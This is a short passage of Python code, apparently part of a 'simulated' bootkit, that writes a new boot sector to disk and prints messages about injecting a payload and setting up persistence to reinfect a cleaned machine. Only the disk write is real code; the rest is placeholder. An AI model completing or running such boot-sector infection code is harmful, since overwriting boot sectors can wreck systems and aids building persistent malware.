        disk.write(new_boot_sector)
        
        # Ensure the payload code executes during the boot process
        # This is a simulation, so we just print a message
        print("Payload code injected and set to execute during boot.")
        
        # Establish persistence by modifying the boot sector to reinfect if cleaned
        # This is a simulation, so we just print a message
        print("Persistence mechanism established to reinfect if cleaned.")
